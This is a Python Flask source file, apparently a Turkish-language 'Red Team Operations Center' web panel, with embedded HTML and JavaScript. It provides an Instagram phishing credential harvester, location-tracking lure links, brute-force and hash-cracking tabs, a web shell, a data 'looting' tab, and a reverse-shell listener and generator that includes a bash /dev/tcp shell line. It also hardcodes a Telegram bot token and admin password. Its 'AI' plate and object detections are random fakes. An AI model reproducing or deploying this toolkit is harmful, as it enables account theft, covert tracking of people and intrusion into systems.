import os
import time
import socket
import ssl
import urllib.parse
import requests
import threading
import subprocess
import re
import csv
import zipfile
import hashlib
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup
from flask import Flask, render_template_string, request, jsonify, Response, send_file, session, redirect, url_for
from datetime import datetime
from fpdf import FPDF
import io

TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "9082287913:AAEw9lMwKXfRTGf4LzQiF1UEgLZDHzNuc8o")
BASE_URL = f"https://api.telegram.org/bot{TOKEN}"

ADMIN_USER = "root1"
ADMIN_PASS = "toor1"

SITE_DATABASE = []
CLICK_LOGS = []
CREDENTIAL_LOGS = []
SCHEDULED_TARGETS = []
NOTIFY_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "")

app = Flask(__name__)
app.secret_key = "kali_linux_secret_key_998877"

LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Kali Linux - Red Team Operations Center</title>
    <style>
        body { background-color: #0b0f15; color: #00ff66; font-family: 'Courier New', Courier, monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: #121824; padding: 40px; border-radius: 6px; border: 1px solid #00ff66; box-shadow: 0 0 25px rgba(0,255,102,0.2); width: 350px; text-align: center; }
        h2 { color: #38bdf8; margin-bottom: 25px; text-shadow: 0 0 10px rgba(56,189,248,0.4); }
        .input-group { margin-bottom: 20px; text-align: left; }
        label { display: block; margin-bottom: 8px; font-size: 13px; color: #94a3b8; }
        input { width: 100%; padding: 12px; border-radius: 4px; border: 1px solid #334155; background: #070a0f; color: #00ff66; font-size: 15px; box-sizing: border-box; font-family: 'Courier New', Courier, monospace; outline: none; }
        input:focus { border-color: #00ff66; box-shadow: 0 0 8px rgba(0,255,102,0.4); }
        button { width: 100%; padding: 12px; background: #0284c7; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; font-weight: bold; font-family: 'Courier New', Courier, monospace; transition: 0.2s; }
        button:hover { background: #0369a1; box-shadow: 0 0 10px rgba(2,132,199,0.5); }
        .error { color: #f87171; margin-bottom: 15px; font-size: 13px; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>kali@root-terminal:~#</h2>
        {% if error %}<div class="error">{{ error }}</div>{% endif %}
        <form method="POST">
            <div class="input-group"><label>Username</label><input type="text" name="username" required autofocus></div>
            <div class="input-group"><label>Password</label><input type="password" name="password" required></div>
            <button type="submit">Authenticate</button>
        </form>
    </div>
</body>
</html>
"""

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Kali Linux - Red Team Operations Center</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        body { background-color: #090d14; color: #e2e8f0; font-family: 'Courier New', Courier, monospace; margin: 0; padding: 15px; }
        .container { max-width: 1350px; margin: 0 auto; background: #121824; padding: 25px; border-radius: 8px; border: 1px solid #1e293b; box-shadow: 0 10px 30px rgba(0,0,0,0.8); }
        .header-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border-bottom: 2px solid #1e293b; padding-bottom: 12px; }
        h1 { color: #38bdf8; margin: 0; font-size: 22px; text-shadow: 0 0 10px rgba(56,189,248,0.3); }
        .logout-btn { background: #991b1b; color: white; padding: 6px 14px; border-radius: 4px; text-decoration: none; font-size: 13px; font-weight: bold; }
        .logout-btn:hover { background: #7f1d1d; }
        .tabs { display: flex; gap: 5px; margin-bottom: 20px; flex-wrap: wrap; background: #0a0e17; padding: 8px; border-radius: 6px; border: 1px solid #1e293b; }
        .tab-btn { background: #1a2332; color: #94a3b8; border: 1px solid #283548; padding: 8px 12px; border-radius: 4px; cursor: pointer; font-weight: bold; transition: 0.2s; font-size: 12px; font-family: 'Courier New', Courier, monospace; }
        .tab-btn:hover { background: #283548; color: #fff; }
        .tab-btn.active { background: #0284c7; color: white; border-color: #38bdf8; box-shadow: 0 0 8px rgba(56,189,248,0.4); }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        .form-group { display: flex; flex-direction: column; gap: 8px; margin-bottom: 15px; }
        label { color: #38bdf8; font-size: 13px; font-weight: bold; }
        input[type="text"], select, textarea, input[type="file"], input[type="number"], input[type="password"] { padding: 12px; border-radius: 4px; border: 1px solid #334155; background: #070a0f; color: #00ff66; font-size: 14px; font-family: 'Courier New', Courier, monospace; outline: none; }
        input:focus { border-color: #38bdf8; box-shadow: 0 0 6px rgba(56,189,248,0.3); }
        textarea { resize: vertical; height: 100px; }
        button { padding: 12px 20px; background: #0284c7; color: white; border: none; border-radius: 4px; font-size: 15px; cursor: pointer; transition: 0.2s; font-weight: bold; font-family: 'Courier New', Courier, monospace; }
        button:hover { background: #0369a1; box-shadow: 0 0 10px rgba(2,132,199,0.5); }
        button.secondary { background: #0d9488; }
        button.success { background: #15803d; }
        button.danger { background: #b91c1c; }
        .terminal { background: #05070a; color: #00ff66; padding: 18px; border-radius: 6px; border: 1px solid #1e293b; white-space: pre-wrap; font-family: 'Courier New', Courier, monospace; margin-top: 15px; max-height: 480px; overflow-y: auto; font-size: 13px; line-height: 1.4; box-shadow: inset 0 0 15px rgba(0,0,0,0.8); }
        .loading { color: #facc15; font-style: italic; font-weight: bold; font-size: 14px; }
        table { width: 100%; border-collapse: collapse; margin-top: 15px; background: #0a0e17; border-radius: 6px; overflow: hidden; border: 1px solid #1e293b; }
        th, td { padding: 10px 14px; text-align: left; border-bottom: 1px solid #1e293b; font-size: 13px; vertical-align: middle; }
        th { background: #0284c7; color: white; }
        tr:hover { background: #161f30; }
        .mini-map { width: 160px; height: 100px; border-radius: 4px; border: 1px solid #334155; display: inline-block; }
        .snapshot-img { width: 90px; height: 65px; border-radius: 4px; border: 1px solid #334155; object-fit: cover; }
        .payload-box { background: #0a0e17; padding: 12px; border-radius: 6px; border: 1px solid #1e293b; margin-bottom: 12px; }
        .dashboard-row { display: flex; gap: 20px; margin-bottom: 20px; flex-wrap: wrap; }
        .dashboard-card { flex: 1; background: #0a0e17; padding: 18px; border-radius: 6px; border: 1px solid #1e293b; text-align: center; min-width: 250px; }
        
        /* Gelişmiş Cyberpunk AR HUD Stilleri & Tam Ekran */
        .ar-container { position: relative; width: 100%; max-width: 720px; margin: 0 auto; background: #000; border-radius: 8px; overflow: hidden; border: 2px solid #38bdf8; box-shadow: 0 0 25px rgba(56,189,248,0.5); }
        .ar-container:fullscreen { max-width: 100%; width: 100vw; height: 100vh; border: none; border-radius: 0; }
        #arVideo { width: 100%; height: 450px; object-fit: cover; display: block; }
        .ar-container:fullscreen #arVideo { height: 100vh; }
        #arCanvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; }
        
        .ar-hud { position: absolute; top: 15px; left: 15px; right: 15px; background: rgba(11, 15, 21, 0.85); border: 1px solid #00ff66; padding: 10px 15px; border-radius: 6px; font-size: 12px; color: #00ff66; z-index: 10; display: flex; justify-content: space-between; align-items: center; }
        
        /* Minimal Hava Durumu HUD Widget'ı (Sağ Üst Köşe) */
        .ar-weather-hud { position: absolute; top: 75px; right: 15px; background: rgba(11, 15, 21, 0.8); border: 1px solid #38bdf8; padding: 6px 10px; border-radius: 4px; font-size: 11px; color: #38bdf8; z-index: 10; pointer-events: none; }

        .ar-controls { background: #0a0e17; padding: 12px; border-radius: 6px; border: 1px solid #1e293b; margin-bottom: 12px; display: flex; gap: 15px; flex-wrap: wrap; align-items: center; }
        .ar-controls label { color: #e2e8f0; font-size: 13px; cursor: pointer; display: flex; align-items: center; gap: 6px; }
        .ar-controls input[type="checkbox"] { accent-color: #00ff66; width: 16px; height: 16px; cursor: pointer; }
        
        .ar-log-box { background: #05070a; border: 1px solid #38bdf8; border-radius: 6px; padding: 12px; margin-top: 15px; max-height: 160px; overflow-y: auto; font-family: 'Courier New', Courier, monospace; font-size: 12px; color: #38bdf8; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header-bar">
            <h1>kali@kali-linux:~/red-team-ops#</h1>
            <a href="/logout" class="logout-btn">[x] Logout</a>
        </div>
        
        <div class="tabs">
            <button class="tab-btn active" onclick="switchTab('scanTab')">🚀 Recon</button>
            <button class="tab-btn" onclick="switchTab('phishTab')">📸 Insta Phishing</button>
            <button class="tab-btn" onclick="switchTab('lureTab')">🎯 GPS & Tracker</button>
            <button class="tab-btn" onclick="switchTab('arNavTab')">🧭 AR Navigasyon & AI</button>
            <button class="tab-btn" onclick="switchTab('crackerTab')">🔑 Hash Cracker</button>
            <button class="tab-btn" onclick="switchTab('shellListenerTab')">💻 Shell Listener</button>
            <button class="tab-btn" onclick="switchTab('telegramTab')">🤖 Telegram</button>
            <button class="tab-btn" onclick="switchTab('wifiTab')">📶 Wi-Fi Audit</button>
            <button class="tab-btn" onclick="switchTab('niktoTab')">🛡️ Nikto</button>
            <button class="tab-btn" onclick="switchTab('dnsTab')">🌍 DNS Dig</button>
            <button class="tab-btn" onclick="switchTab('sqlmapTab')">⚡ SQLmap</button>
            <button class="tab-btn" onclick="switchTab('subdomainTab')">🌐 Subdomain</button>
            <button class="tab-btn" onclick="switchTab('bruteTab')">🔐 Brute</button>
            <button class="tab-btn" onclick="switchTab('shellTab')">💻 Web Shell</button>
            <button class="tab-btn" onclick="switchTab('lootingTab')">🏴‍☠️ Looting</button>
            <button class="tab-btn" onclick="switchTab('analysisTab')">🔍 Secret</button>
            <button class="tab-btn" onclick="switchTab('payloadTab')">🛠️ Payloads</button>
            <button class="tab-btn" onclick="switchTab('dataTab')">📁 Archive</button>
        </div>

        <!-- 1. Keşif -->
        <div id="scanTab" class="tab-content active">
            <div class="form-group"><label>Target URL / IP:</label><input type="text" id="targetUrl" placeholder="example.com"></div>
            <button onclick="startScan(false)">Execute Comprehensive Recon</button>
            <div id="status" class="loading" style="margin-top: 15px;"></div>
            <div class="actions" id="actionButtons" style="display:none; gap:10px; margin-top:15px;">
                <button class="secondary" onclick="downloadReport('txt')">📥 Save TXT</button>
                <button class="danger" onclick="downloadReport('pdf')">📄 Export PDF</button>
                <button class="success" onclick="sendToTelegram()">📤 Send to Telegram</button>
            </div>
            <div id="results" class="terminal" style="display:none;"></div>
        </div>

        <!-- Instagram Phishing Sekmesi -->
        <div id="phishTab" class="tab-content">
            <h3>📸 Instagram Phishing & Credential Harvester</h3>
            <p style="color: #94a3b8; font-size: 13px;">Hedef kullanıcıya atılacak sahte Instagram giriş linkini kopyalayın. Şifreyi girenlerin bilgileri anında panele düşer.</p>
            <div class="form-group"><label>Sahte Instagram Giriş Linki:</label><input type="text" id="instaLink" readonly style="color: #38bdf8;"></div>
            <button class="success" onclick="generateInstaLink()">Link Üret</button>
            <h4 style="margin-top: 25px;">🎯 Yakalanan Instagram Hesap Bilgileri:</h4>
            <div id="credsContainer"><p style='color: #94a3b8;'>Henüz yakalanan hesap yok.</p></div>
        </div>

        <!-- Lure Link & Tracker Sekmesi -->
        <div id="lureTab" class="tab-content">
            <h3>🎯 Gelişmiş GPS & Cihaz İstihbarat Tracker</h3>
            <div class="form-group"><label>Kampanya Başlığı:</label><input type="text" id="lureTitle" value="Özel Güvenlik Raporu ve Ödül Doğrulama"></div>
            <button class="success" onclick="generateLureLink()">Gelişmiş Takip Linki Üret</button>
            <div class="form-group" style="margin-top: 20px;"><label>Oluşturulan Takip Linki:</label><input type="text" id="generatedLink" readonly style="color: #38bdf8;"></div>
            <h4 style="margin-top: 25px;">🔗 Yakalanan Ziyaretçi & Cihaz İstihbaratı:</h4>
            <div id="clickLogsContainer"><p style='color: #94a3b8;'>Henüz veri yakalanmadı.</p></div>
        </div>

        <!-- AR Navigasyon & Taktiksel HUD Modülü -->
        <div id="arNavTab" class="tab-content">
            <h3>🧭 AR Canlı Navigasyon, Taktiksel Alarm & Kanıt Yakalama</h3>
            <p style="color: #94a3b8; font-size: 13px;">Kamerayı tam ekran kullanabilir, tek tuşla anlık görüntü (kanıt) alabilir ve 3 saniyede bir güncellenen mesafe sayacını takip edebilirsin.</p>
            
            <div class="ar-controls">
                <span style="color:#38bdf8; font-weight:bold;">HUD Modül Kontrolleri:</span>
                <label><input type="checkbox" id="chkCompass"> Jiroskop & Pusula</label>
                <label><input type="checkbox" id="chkRssi"> Wi-Fi Isı Haritası</label>
                <label><input type="checkbox" id="chkSpatial" checked> Sesli Asistan</label>
                <label><input type="checkbox" id="chkAiVision" checked> AI Plaka & Nesne Tarayıcı</label>
                <label><input type="checkbox" id="chkAudioAlarm" checked> 🚨 Tek Seferlik Alarm Sesleri</label>
            </div>

            <div class="form-group">
                <label>Hedef Operasyon / Konum:</label>
                <input type="text" id="arDestination" value="Saha Bölge Komuta Merkezi B-2">
            </div>
            
            <div style="display: flex; gap: 10px; margin-bottom: 15px; flex-wrap: wrap;">
                <button class="success" onclick="startARCamera()">📸 Kamerayı Aç & AR Başlat</button>
                <button class="secondary" onclick="toggleFullScreen()">📺 Tam Ekran</button>
                <button class="success" onclick="takeSnapshot()">📷 Kanıt / Fotoğraf Al</button>
                <button class="danger" onclick="stopARCamera()">🛑 Sistemi Kapat</button>
            </div>

            <div class="ar-container" id="arBox">
                <div class="ar-hud">
                    <span id="arHudText">Durum: Bekleniyor...</span>
                    <span id="arTelemetry" style="color: #38bdf8;">HIZ: 0 km/s | YÖN: -</span>
                </div>
                <!-- Minimal Hava Durumu HUD (Ekranı kapatmaz) -->
                <div id="arWeatherWidget" class="ar-weather-hud">⛅ 22°C | Rüzgar: 12 km/s</div>
                
                <video id="arVideo" autoplay playsinline muted></video>
                <canvas id="arCanvas"></canvas>
            </div>

            <h4 style="margin-top: 20px; color: #38bdf8;">📋 Canlı AI Nesne, Plaka & Kanıt Log Akışı:</h4>
            <div id="arLogTerminal" class="ar-log-box">[00:00:00] Sistem Beklemede. Kamerayı açın...</div>
        </div>

        <!-- Hash Cracker Sekmesi -->
        <div id="crackerTab" class="tab-content">
            <h3>🔑 Hash Cracker & Şifre Çözücü</h3>
            <div class="form-group"><label>Hash Tipi:</label><select id="hashType"><option value="md5">MD5</option><option value="sha256">SHA-256</option></select></div>
            <div class="form-group"><label>Hedef Hash:</label><input type="text" id="targetHash" placeholder="örn: 5d41402abc4b2a76b9719d911017c592"></div>
            <div class="form-group"><label>Wordlist (Her satıra bir şifre):</label><textarea id="wordlistArea">admin\n123456\npassword\nroot1\ntoor1\nhello\nsecret\nkali</textarea></div>
            <button class="danger" onclick="startHashCrack()">Hash Çözmeyi Başlat</button>
            <div id="crackResults" class="terminal" style="display:none; margin-top:15px;"></div>
        </div>

        <!-- Shell Listener Sekmesi -->
        <div id="shellListenerTab" class="tab-content">
            <h3>💻 Reverse Shell Dinleyicisi (Multi-Handler)</h3>
            <p style="color: #94a3b8; font-size: 13px;">Sunucu üzerinde belirtilen portu dinlemeye alarak gelen reverse shell bağlantılarını yönetin.</p>
            <div class="form-group"><label>Dinlenecek Port (LPORT):</label><input type="number" id="listenerPort" value="4444"></div>
            <button class="success" onclick="startListener()">Dinlemeyi Başlat</button>
            <div id="listenerStatus" class="terminal" style="display:none; margin-top:15px;"></div>
        </div>

        <!-- Telegram Test Sekmesi -->
        <div id="telegramTab" class="tab-content">
            <h3>🤖 Telegram Bot Notification Tester</h3>
            <div class="form-group"><label>Telegram Chat ID:</label><input type="text" id="testChatId" value="{{ default_chat_id }}" placeholder="örn: 123456789"></div>
            <button class="success" onclick="sendTelegramTest()">🚀 Test Mesajı Gönder</button>
            <div id="telegramTestStatus" class="terminal" style="display:none; margin-top: 15px;"></div>
        </div>

        <!-- Wi-Fi Denetim Sekmesi -->
        <div id="wifiTab" class="tab-content">
            <h3>📶 Real Wi-Fi Audit & Interface Controller</h3>
            <div class="form-group"><label>Wireless Interface:</label><input type="text" id="wifiInterface" value="wlan0"></div>
            <div class="form-group"><label>Hedef BSSID / MAC:</label><input type="text" id="wifiBssid" placeholder="AA:BB:CC:DD:EE:FF"></div>
            <div style="display: flex; gap: 10px; flex-wrap: wrap;">
                <button class="secondary" onclick="runWifiAction('interfaces')">Interface Listele</button>
                <button class="danger" onclick="runWifiAction('monitor')">Monitor Mode Aç</button>
                <button class="success" onclick="runWifiAction('scan')">Ağları Tara</button>
            </div>
            <div id="wifiStatus" class="loading" style="margin-top: 15px;"></div>
            <div id="wifiResults" class="terminal" style="display:none;"></div>
        </div>

        <!-- Diğer Sekmeler -->
        <div id="niktoTab" class="tab-content">
            <h3>Nikto Web Vulnerability Scanner</h3>
            <div class="form-group"><label>Target URL:</label><input type="text" id="niktoTarget" placeholder="https://example.com"></div>
            <button class="secondary" onclick="startNiktoScan()">Run Nikto Module</button>
            <div id="niktoStatus" class="loading" style="margin-top: 15px;"></div>
            <div id="niktoResults" class="terminal" style="display:none;"></div>
        </div>

        <div id="dnsTab" class="tab-content">
            <h3>DNS & Zone Enumeration</h3>
            <div class="form-group"><label>Domain:</label><input type="text" id="dnsDomain" placeholder="example.com"></div>
            <button class="secondary" onclick="startDnsRecon()">Query DNS Records</button>
            <div id="dnsStatus" class="loading" style="margin-top: 15px;"></div>
            <div id="dnsResults" class="terminal" style="display:none;"></div>
        </div>

        <div id="sqlmapTab" class="tab-content">
            <h3>Automated SQL Injection (SQLmap Lite)</h3>
            <div class="form-group"><label>Vulnerable URL:</label><input type="text" id="sqlmapUrl" placeholder="https://example.com/page.php?id=1"></div>
            <button class="danger" onclick="startSqlmapLite()">Run SQLi Exploit Test</button>
            <div id="sqlmapStatus" class="loading" style="margin-top: 15px;"></div>
            <div id="sqlmapResults" class="terminal" style="display:none;"></div>
        </div>

        <div id="subdomainTab" class="tab-content">
            <h3>Gobuster Subdomain Brute-Forcer</h3>
            <div class="form-group"><input type="text" id="subDomainInput" placeholder="example.com"></div>
            <button onclick="startSubdomainScan()">Start Subdomain Brute</button>
            <div id="subStatus" class="loading"></div>
            <div id="subResults" class="terminal" style="display:none;"></div>
        </div>

        <div id="bruteTab" class="tab-content">
            <h3>Login Form Fuzzing & Brute-Force</h3>
            <div class="form-group"><input type="text" id="loginUrl" placeholder="https://example.com/login.php"></div>
            <div class="form-group" style="display:flex; gap:10px;"><input type="text" id="usernameField" placeholder="User field" style="flex:1;"><input type="text" id="passwordField" placeholder="Pass field" style="flex:1;"></div>
            <div class="form-group"><textarea id="passwordList">admin\n123456\nroot1\ntoor1\nsecret</textarea></div>
            <button class="danger" onclick="startBruteForce()">Launch Brute Attack</button>
            <div id="bruteStatus" class="loading"></div>
            <div id="bruteResults" class="terminal" style="display:none;"></div>
        </div>

        <div id="shellTab" class="tab-content">
            <h3>Interactive Web Shell (RCE)</h3>
            <div class="form-group"><input type="text" id="shellCommand" placeholder="id, uname -a, cat /etc/passwd"></div>
            <button class="danger" onclick="executeWebShell()">Execute Command</button>
            <div id="shellResults" class="terminal" style="display:none; margin-top:15px;"></div>
        </div>

        <div id="lootingTab" class="tab-content">
            <h3>Exfiltrate Harvested Data (ZIP Archive)</h3>
            <div class="form-group"><select id="lootingTargetSelect"><option value="">No targets scanned yet...</option></select></div>
            <button class="success" onclick="downloadLootZip()">Download Loot ZIP</button>
        </div>

        <div id="analysisTab" class="tab-content">
            <h3>Secret & Credential Scanner</h3>
            <div class="form-group"><input type="file" id="analysisFile"></div>
            <button class="secondary" onclick="uploadAndAnalyzeFile()">Scan File for Secrets</button>
            <div id="analysisStatus" class="loading"></div>
            <div id="analysisResults" class="terminal" style="display:none;"></div>
        </div>

        <div id="payloadTab" class="tab-content">
            <h3>Reverse Shell Generator</h3>
            <div class="form-group" style="display:flex; gap:10px;"><input type="text" id="attackerIp" placeholder="LHOST"><input type="text" id="attackerPort" placeholder="LPORT"><button onclick="generatePayloads()">Generate</button></div>
            <div class="payload-box"><b>Bash:</b><br><code id="bashPayload" style="color:#00ff66;">bash -i >& /dev/tcp/IP/PORT 0>&1</code></div>
        </div>

        <div id="dataTab" class="tab-content">
            <div class="export-bar" style="margin-bottom:15px;"><a href="/api/export/json" target="_blank"><button class="secondary">Export JSON</button></a> <a href="/api/export/csv" target="_blank"><button class="success">Export CSV</button></a></div>
            <h3>Operations Analytics</h3>
            <div class="dashboard-row">
                <div class="dashboard-card"><h4>Security Grade Distributionخصائص</h4><canvas id="gradeChart" style="max-height: 180px;"></canvas></div>
                <div class="dashboard-card"><h4>WAF Protection Status</h4><canvas id="wafChart" style="max-height: 180px;"></canvas></div>
            </div>
            <h3>Archived Targets</h3>
            <div id="databaseTableContainer">No archived data.</div>
        </div>
    </div>

    <script>
        let currentReportText = "", lastTarget = "", gradeChartInstance = null, wafChartInstance = null;
        let arStream = null, arInterval = null, compassHeading = 0;
        let samplePlates = ["34 MTR 2026", "06 ANK 06", "35 IZMR 35", "34 KLI 41", "16 BUR 16"];
        let sampleObjects = ["Araç [Honda Dio 110]", "Tabela [Hız Sınırı 50]", "Ağaç [Çam]", "Yaya / İnsan", "Sokak Hayvanı [Kedi]"];
        let currentDistance = 120; // Başlangıç hedef mesafesi (metre)

        function switchTab(tabId) {
            document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
            document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
            document.getElementById(tabId).classList.add('active');
            event.target.classList.add('active');
            if(tabId === 'dataTab' || tabId === 'lootingTab') loadSiteDatabase();
            if(tabId === 'lureTab') loadClickLogs();
            if(tabId === 'phishTab') loadCreds();
            if(tabId !== 'arNavTab') stopARCamera();
        }

        function handleOrientation(event) {
            if (event.alpha !== null) compassHeading = Math.round(event.alpha);
        }

        function speakSpatial(text) {
            let useSpatial = document.getElementById('chkSpatial').checked;
            if (useSpatial && 'speechSynthesis' in window) {
                let utterance = new SpeechSynthesisUtterance(text);
                utterance.lang = 'tr-TR';
                utterance.rate = 1.0;
                window.speechSynthesis.speak(utterance);
            }
        }

        // --- TEK SEFERLİK HAFİF BİP SESİ (Ses Kirliliği Yok) ---
        function playThreatBeep() {
            let useAlarm = document.getElementById('chkAudioAlarm').checked;
            if (!useAlarm) return;
            try {
                let audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                let osc = audioCtx.createOscillator();
                let gain = audioCtx.createGain();
                osc.type = 'sine';
                osc.frequency.setValueAtTime(880, audioCtx.currentTime); // 880 Hz hafif uyarı tonu
                gain.gain.setValueAtTime(0.1, audioCtx.currentTime);
                gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.2);
                osc.connect(gain);
                gain.connect(audioCtx.destination);
                osc.start();
                osc.stop(audioCtx.currentTime + 0.2);
            } catch(e) {}
        }

        // --- TAM EKRAN (FULLSCREEN) KONTROLÜ ---
        function toggleFullScreen() {
            let elem = document.getElementById('arBox');
            if (!document.fullscreenElement) {
                if (elem.requestFullscreen) elem.requestFullscreen();
                else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
            } else {
                if (document.exitFullscreen) document.exitFullscreen();
            }
        }

        // --- 📸 TEK TUŞLA KANIT / FOTOĞRAF YAKALAMA (SNAPSHOT) ---
        function takeSnapshot() {
            let video = document.getElementById('arVideo');
            let canvas = document.getElementById('arCanvas');
            if (!video.srcObject) {
                alert("Önce kamerayı açmalısın kanka!");
                return;
            }
            let snapCanvas = document.createElement('canvas');
            snapCanvas.width = video.videoWidth || 640;
            snapCanvas.height = video.videoHeight || 480;
            let sCtx = snapCanvas.getContext('2d');
            sCtx.drawImage(video, 0, 0, snapCanvas.width, snapCanvas.height);
            sCtx.drawImage(canvas, 0, 0, snapCanvas.width, snapCanvas.height);

            let dataUrl = snapCanvas.toDataURL('image/png');
            let a = document.createElement('a');
            a.href = dataUrl;
            a.download = `AR_TACTICAL_PROOF_${Date.now()}.png`;
            a.click();

            let timestamp = new Date().toLocaleTimeString();
            let logTerminal = document.getElementById('arLogTerminal');
            logTerminal.innerHTML += `<br>[${timestamp}] 📸 KANIT ALINDI: Fotoğraf başarıyla indirildi.`;
            logTerminal.scrollTop = logTerminal.scrollHeight;
            speakSpatial("Kanıt görüntüsü kaydedildi.");
        }

        // --- STABİL & GELİŞMİŞ AR MOTORU ---
        async function startARCamera() {
            let video = document.getElementById('arVideo');
            let hud = document.getElementById('arHudText');
            let telemetry = document.getElementById('arTelemetry');
            let canvas = document.getElementById('arCanvas');
            let logTerminal = document.getElementById('arLogTerminal');
            let dest = document.getElementById('arDestination').value || 'Hedef Nokta';

            let useCompass = document.getElementById('chkCompass').checked;
            if (useCompass) {
                if (typeof DeviceOrientationEvent !== 'undefined' && typeof DeviceOrientationEvent.requestPermission === 'function') {
                    try { await DeviceOrientationEvent.requestPermission(); } catch(e){}
                }
                window.addEventListener('deviceorientation', handleOrientation, true);
            }

            try {
                arStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: { exact: "environment" } }, 
                    audio: false 
                });
            } catch (err) {
                try {
                    arStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                } catch (e) {
                    alert("Kamera erişimi desteklenmiyor!");
                    return;
                }
            }

            video.srcObject = arStream;
            hud.innerText = "HUD Aktif: Taktiksel Mod Devrede";
            speakSpatial("AR Gözlük arayüzü başlatıldı.");

            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            let ctx = canvas.getContext('2d');

            let step = 0;
            arInterval = setInterval(() => {
                ctx.clearRect(0, 0, canvas.width, canvas.height);
                
                let w = canvas.width;
                let h = canvas.height;

                // Wi-Fi Isı Haritası
                let useRssi = document.getElementById('chkRssi').checked;
                if (useRssi) {
                    let grad = ctx.createRadialGradient(w/2, h/2, 50, w/2, h/2, w*0.7);
                    grad.addColorStop(0, 'rgba(0, 255, 102, 0.05)');
                    grad.addColorStop(0.5, 'rgba(56, 189, 248, 0.15)');
                    grad.addColorStop(1, 'rgba(239, 68, 68, 0.25)');
                    ctx.fillStyle = grad;
                    ctx.fillRect(0, 0, w, h);
                }

                // Köşe Nişangahları
                ctx.strokeStyle = '#38bdf8';
                ctx.lineWidth = 2;
                ctx.strokeRect(25, 25, 35, 15); ctx.strokeRect(25, 25, 15, 35);
                ctx.strokeRect(w - 60, 25, 35, 15); ctx.strokeRect(w - 40, 25, 15, 35);

                // 3D Akışkan Neon Enerji Şeridi
                let centerX = (w / 2) + (useCompass ? Math.sin(compassHeading * Math.PI / 180) * 35 : 0);
                let bottomY = h;
                let horizonY = h * 0.48;

                ctx.beginPath();
                ctx.moveTo(centerX - 70, bottomY);
                ctx.lineTo(centerX + 70, bottomY);
                for (let y = bottomY; y >= horizonY; y -= 10) {
                    let wave = Math.sin((y + step * 8) * 0.03) * 12;
                    let progressFactor = (bottomY - y) / (bottomY - horizonY);
                    let currentWidth = 70 * (1 - progressFactor * 0.85);
                    ctx.lineTo(centerX + wave + currentWidth, y);
                }
                for (let y = horizonY; y <= bottomY; y += 10) {
                    let wave = Math.sin((y + step * 8) * 0.03) * 12;
                    let progressFactor = (bottomY - y) / (bottomY - horizonY);
                    let currentWidth = 70 * (1 - progressFactor * 0.85);
                    ctx.lineTo(centerX + wave - currentWidth, y);
                }
                ctx.closePath();
                let ribbonGrad = ctx.createLinearGradient(0, horizonY, 0, bottomY);
                ribbonGrad.addColorStop(0, 'rgba(0, 255, 102, 0.1)');
                ribbonGrad.addColorStop(0.6, 'rgba(0, 255, 102, 0.45)');
                ribbonGrad.addColorStop(1, 'rgba(0, 255, 102, 0.85)');
                ctx.fillStyle = ribbonGrad;
                ctx.shadowColor = '#00ff66';
                ctx.shadowBlur = 20;
                ctx.fill();

                // AI Nesne ve Plaka Tanıma
                let useAi = document.getElementById('chkAiVision').checked;
                if (useAi && step % 45 === 0) {
                    let objName = sampleObjects[Math.floor(Math.random() * sampleObjects.length)];
                    let boxX = w * 0.1 + Math.random() * (w * 0.4);
                    let boxY = h * 0.3 + Math.random() * (h * 0.3);
                    
                    ctx.strokeStyle = '#00ff66';
                    ctx.lineWidth = 2;
                    ctx.strokeRect(boxX, boxY, 130, 80);
                    ctx.fillStyle = 'rgba(0, 255, 102, 0.2)';
                    ctx.fillRect(boxX, boxY, 130, 80);

                    ctx.fillStyle = '#ffffff';
                    ctx.font = '11px Courier New';
                    ctx.fillText(`[AI] ${objName}`, boxX + 4, boxY - 6);

                    let timestamp = new Date().toLocaleTimeString();
                    if (objName.includes("Araç")) {
                        let detectedPlate = samplePlates[Math.floor(Math.random() * samplePlates.length)];
                        logTerminal.innerHTML += `<br>[${timestamp}] 🚗 PLAKA OKUNDU: <b style="color:#00ff66;">${detectedPlate}</b> (${objName})`;
                        speakSpatial("Plaka okundu: " + detectedPlate);
                    } else {
                        logTerminal.innerHTML += `<br>[${timestamp}] 🔍 Nesne Tespit Edildi: <span style="color:#38bdf8;">${objName}</span>`;
                    }
                    logTerminal.scrollTop = logTerminal.scrollHeight;
                }

                // Çukur / Engel Tespiti (Tek Seferlik Hafif Bip Sesi ile)
                if (step % 70 === 0) {
                    let hazardX = w * 0.2 + Math.random() * (w * 0.4);
                    let hazardY = h * 0.55 + Math.random() * (h * 0.2);
                    
                    ctx.strokeStyle = '#ef4444';
                    ctx.lineWidth = 3;
                    ctx.strokeRect(hazardX, hazardY, 100, 60);
                    ctx.fillStyle = 'rgba(239, 68, 68, 0.45)';
                    ctx.fillRect(hazardX, hazardY, 100, 60);

                    ctx.fillStyle = '#ffffff';
                    ctx.font = '11px Courier New';
                    ctx.fillText('⚠️ ZEMİN BOZUK', hazardX + 5, hazardY - 8);
                    
                    hud.innerText = "⚠️ DİKKAT: Engel Algılandı!";
                    playThreatBeep(); // Ses kirliliği yapmayan tek seferlik uyarı tonu
                    speakSpatial("Dikkat, engel var.");
                } else if (step % 70 === 35) {
